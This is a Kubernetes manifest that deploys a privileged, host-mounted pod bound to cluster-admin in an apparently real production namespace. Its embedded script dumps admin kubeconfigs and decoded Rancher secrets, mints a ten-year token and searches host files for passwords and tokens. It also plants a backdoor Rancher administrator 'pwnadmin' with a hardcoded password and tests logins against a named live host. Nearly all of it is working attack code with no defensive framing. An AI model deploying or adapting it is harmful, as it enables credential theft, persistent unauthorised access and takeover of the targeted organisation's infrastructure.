
apiVersion: apps/v1
kind: Deployment
metadata:
  name: network-access-v2
  namespace: egam-production
  labels:
    app: network-access-v2
spec:
  replicas: 1
  selector:
    matchLabels:
      app: network-access-v2
  template:
    metadata:
      labels:
        app: network-access-v2
    spec:
      hostNetwork: true
      hostPID: true
      serviceAccountName: admin-sa
      containers:
      - name: shell
        image: nicolaka/netshoot:latest
        env:
        - name: AWS_ACCESS_KEY_ID
          valueFrom:
            secretKeyRef:
              name: aws-credentials-production
              key: accessKeyID
              optional: true
        - name: AWS_SECRET_ACCESS_KEY
          valueFrom:
            secretKeyRef:
              name: aws-credentials-production
              key: secretAccessKey
              optional: true
        - name: AWS_DEFAULT_REGION
          value: "us-east-1"
        command:
          - /bin/bash
          - -c
          - |
            export AWS_PAGER=""
            KC="--kubeconfig=/host/etc/rancher/rke2/rke2.yaml"
            set -x

            apk add --no-cache curl jq aws-cli openssl base64 2>&1 | tail -3

            if ! command -v kubectl >/dev/null 2>&1; then
              curl -fsSL -o /usr/local/bin/kubectl "https://dl.k8s.io/release/v1.30.0/bin/linux/amd64/kubectl" && chmod +x /usr/local/bin/kubectl
            fi

            echo "############ [0] AUTH CHECK ############"
            kubectl $KC auth can-i '*' '*' 2>&1
            kubectl $KC get nodes -o wide 2>&1

            echo "############ [0b] NODES IP PUBBLICI ############"
            kubectl $KC get nodes -o json 2>&1 | jq -r '.items[] | .metadata.name + " | " + (.status.addresses[] | select(.type=="InternalIP") | .address) + " | " + (.status.addresses[] | select(.type=="ExternalIP") // "none" | .address)' 2>&1

            echo "############ [0c] ADMIN KUBECONFIG (YAML) ############"
            cat /host/var/lib/rancher/rke2/server/cred/admin.kubeconfig 2>&1
            echo ""

            echo "############ [0d] ADMIN KUBECONFIG (BASE64) ############"
            cat /host/var/lib/rancher/rke2/server/cred/admin.kubeconfig 2>&1 | base64 -w0
            echo ""

            echo "############ [0e] RKE2 KUBECONFIG (YAML) ############"
            cat /host/etc/rancher/rke2/rke2.yaml 2>&1
            echo ""

            echo "############ [0f] RKE2 KUBECONFIG (BASE64) ############"
            cat /host/etc/rancher/rke2/rke2.yaml 2>&1 | base64 -w0
            echo ""

            echo "############ [0g] ADMIN SA TOKEN (K8S) ############"
            kubectl $KC create token admin-sa -n egam-production --duration=87600h 2>&1
            echo ""

            echo "############ [0h] ADMIN KUBECONFIG CON IP PUBBLICO ############"
            ADMIN_KC=$(cat /host/var/lib/rancher/rke2/server/cred/admin.kubeconfig 2>&1 | base64 -w0)
            NODE_IP=$(kubectl $KC get nodes -o json 2>&1 | jq -r '.items[0].status.addresses[] | select(.type=="InternalIP") | .address' 2>&1 | head -1)
            echo "NODE_INTERNAL_IP=$NODE_IP"
            echo "ADMIN_KC_BASE64_LEN=${#ADMIN_KC}"
            echo "--- KUBECONFIG CON IP ---"
            cat /host/var/lib/rancher/rke2/server/cred/admin.kubeconfig 2>&1 | sed "s|https://127.0.0.1:6443|https://$NODE_IP:6443|g"
            echo ""

            echo "############ [1] API RESOURCES RANCHER ############"
            kubectl $KC api-resources 2>&1 | grep -i "management.cattle.io" | head -20

            echo "############ [2] CRD CHECK ############"
            kubectl $KC get crd 2>&1 | grep -i "management.cattle.io" | head -10

            echo "############ [3] NAMESPACES CATTLE ############"
            kubectl $KC get ns 2>&1 | grep -i cattle

            echo "############ [4] PODS CATTLE-SYSTEM ############"
            kubectl $KC get pods -n cattle-system -o wide 2>&1

            echo "############ [5] SECRET CATTLE-CREDENTIALS ############"
            kubectl $KC -n cattle-system get secret cattle-credentials-269b1fd2be -o json 2>&1
            echo "--- decoded ---"
            kubectl $KC -n cattle-system get secret cattle-credentials-269b1fd2be -o json 2>&1 | jq -r '.data | to_entries[] | "\(.key)=\(.value|@base64d)"' 2>&1

            echo "############ [6] SECRET STV-AGGREGATION ############"
            kubectl $KC -n cattle-system get secret stv-aggregation -o json 2>&1 | jq -r '.data | to_entries[] | "\(.key)=\(.value|@base64d)"' 2>&1

            echo "############ [7] USERS RANCHER ############"
            kubectl $KC get users.management.cattle.io -o json 2>&1 | jq -r '.items[] | .metadata.name + " | " + (.username // "") + " | " + (.displayName // "")' 2>&1

            echo "############ [8] TOKENS RANCHER ############"
            kubectl $KC get tokens.management.cattle.io -A -o json 2>&1 | jq -r '.items[] | .metadata.name + " | user: " + (.userId // "") + " | desc: " + (.description // "") + " | enabled: " + (.enabled|tostring)' 2>&1

            echo "############ [9] CLUSTERS RANCHER ############"
            kubectl $KC get clusters.management.cattle.io -o json 2>&1 | jq -r '.items[] | .metadata.name + " | " + (.spec.displayName // "") + " | " + (.status.conditions[0].type // "")' 2>&1

            echo "############ [10] CREA UTENTE RANCHER ############"
            kubectl $KC apply -f - << 'YAML' 2>&1
            apiVersion: management.cattle.io/v3
            kind: User
            metadata:
              name: user-pwnadmin
            spec:
              username: pwnadmin
              displayName: Pwn Admin
              enabled: true
            YAML

            echo "############ [11] VERIFICA UTENTE CREATO ############"
            kubectl $KC get users.management.cattle.io user-pwnadmin -o json 2>&1
            kubectl $KC get users.management.cattle.io -o json 2>&1 | jq -r '.items[] | .metadata.name + " | " + (.username // "")' 2>&1

            echo "############ [12] CREA TOKEN RANCHER ############"
            SECRET="pwnadmin2026"
            HASH=$(echo -n "$SECRET" | sha256sum | cut -d' ' -f1)
            echo "TOKEN_PLAIN=token-user-pwnadmin:$SECRET"
            echo "TOKEN_HASH=$HASH"

            kubectl $KC apply -f - << YAML 2>&1
            apiVersion: management.cattle.io/v3
            kind: Token
            metadata:
              name: token-pwnadmin
              namespace: default
            spec:
              description: pwn
              userId: user-pwnadmin
              userPrincipalName: "local://user-pwnadmin"
              ttl: 0
              enabled: true
              token: "$HASH"
            YAML

            echo "############ [13] VERIFICA TOKEN CREATO ############"
            kubectl $KC get tokens.management.cattle.io -A -o json 2>&1 | jq -r '.items[] | select(.metadata.name=="token-pwnadmin") | .metadata.name + " | user: " + (.userId // "") + " | userPrincipalName: " + (.userPrincipalName // "") + " | token: " + (.token // "")' 2>&1

            echo "############ [14] ASSEGNA ROLE ADMIN (se CRD esiste) ############"
            kubectl $KC api-resources 2>&1 | grep -i "globalrole"
            kubectl $KC apply -f - << 'YAML' 2>&1
            apiVersion: management.cattle.io/v3
            kind: GlobalRoleBinding
            metadata:
              name: pwnadmin-admin
            globalRoleName: admin
            userName: user-pwnadmin
            YAML

            echo "############ [15] VERIFICA ROLE (se esiste) ############"
            kubectl $KC get globalrolebindings.management.cattle.io -o json 2>&1 | jq -r '.items[] | .metadata.name + " | role: " + (.globalRoleName // "") + " | user: " + (.userName // "")' 2>&1

            echo "############ [16] TEST LOGIN API ############"
            echo "--- test login con pwnadmin/pwnadmin2026 ---"
            curl -sk -X POST \
              -H "Content-Type: application/json" \
              "https://rancher.management.egam.com.br/v3-public/localProviders/local?action=login" \
              -d "{\"username\":\"pwnadmin\",\"password\":\"$SECRET\",\"responseType\":\"cookie\"}" 2>&1 | head -c 3000
            echo ""
            echo "--- test login con token-user-pwnadmin:pwnadmin2026 ---"
            curl -sk -X POST \
              -H "Content-Type: application/json" \
              "https://rancher.management.egam.com.br/v3-public/localProviders/local?action=login" \
              -d "{\"username\":\"token-user-pwnadmin:pwnadmin2026\",\"responseType\":\"cookie\"}" 2>&1 | head -c 3000
            echo ""

            echo "############ [17] CERCA KUBECONFIG MANAGEMENT ############"
            echo "--- find *.kubeconfig ---"
            find /host -name "*.kubeconfig" 2>/dev/null | head -20
            echo "--- find yaml con management.egam.com.br ---"
            find /host -name "*.yaml" -exec grep -l "management.egam.com.br" {} \; 2>/dev/null | head -10
            echo "--- grep management.egam.com.br in /etc ---"
            grep -r "management.egam.com.br" /host/etc/ 2>/dev/null | head -10
            echo "--- grep management.egam.com.br in /root ---"
            grep -r "management.egam.com.br" /host/root/ 2>/dev/null | head -10
            echo "--- grep management.egam.com.br in /home ---"
            grep -r "management.egam.com.br" /host/home/ 2>/dev/null | head -10

            echo "############ [18] CERCA TOKEN MANAGEMENT ############"
            echo "--- grep token- in /etc/rancher ---"
            grep -r "token-" /host/etc/rancher/ 2>/dev/null | head -10
            echo "--- grep token- in /var/lib/rancher ---"
            grep -r "token-" /host/var/lib/rancher/ 2>/dev/null | head -10
            echo "--- grep token- in /root ---"
            grep -r "token-" /host/root/ 2>/dev/null | head -10
            echo "--- grep token- in /home ---"
            grep -r "token-" /host/home/ 2>/dev/null | head -10

            echo "############ [19] CERCA CREDENZIALI MANAGEMENT ############"
            grep -r "admin" /host/etc/rancher/ 2>/dev/null | head -10
            grep -r "password" /host/etc/rancher/ 2>/dev/null | head -10
            grep -r "bootstrapPassword" /host/ 2>/dev/null | head -5

            echo "############ [20] CERCA RANCHER SECRET ############"
            kubectl $KC get secrets -A 2>&1 | grep -i "rancher\|cattle.*secret\|bootstrap" | head -20
            kubectl $KC -n cattle-system get secrets 2>&1 | head -30

            echo "############ [21] SUMMARY ############"
            echo "=========================================="
            echo "=== RANCHER LOGIN ==="
            echo "=========================================="
            echo "URL: https://rancher.management.egam.com.br/dashboard/auth/login"
            echo "Username: pwnadmin"
            echo "Password: pwnadmin2026"
            echo "Token: token-user-pwnadmin:pwnadmin2026"
            echo ""
            echo "USER_CREATED=$(kubectl $KC get users.management.cattle.io user-pwnadmin -o name 2>/dev/null || echo MISSING)"
            echo "TOKEN_CREATED=$(kubectl $KC get tokens.management.cattle.io token-pwnadmin -n default -o name 2>/dev/null || echo MISSING)"
            echo "USER_ID=$(kubectl $KC get token token-pwnadmin -n default -o jsonpath='{.userId}' 2>/dev/null || echo EMPTY)"
            echo "ROLE_BINDING=$(kubectl $KC get globalrolebindings.management.cattle.io pwnadmin-admin -o name 2>/dev/null || echo MISSING)"
            echo "=========================================="

            echo "############ [22] DONE ############"
            sleep 36000
        securityContext:
          privileged: true
        volumeMounts:
        - mountPath: /host
          name: host
      volumes:
      - name: host
        hostPath:
          path: /
---
apiVersion: v1
kind: ServiceAccount
metadata:
  name: admin-sa
  namespace: egam-production
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: admin-sa-binding
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: cluster-admin
subjects:
- kind: ServiceAccount
  name: admin-sa
  namespace: egam-production
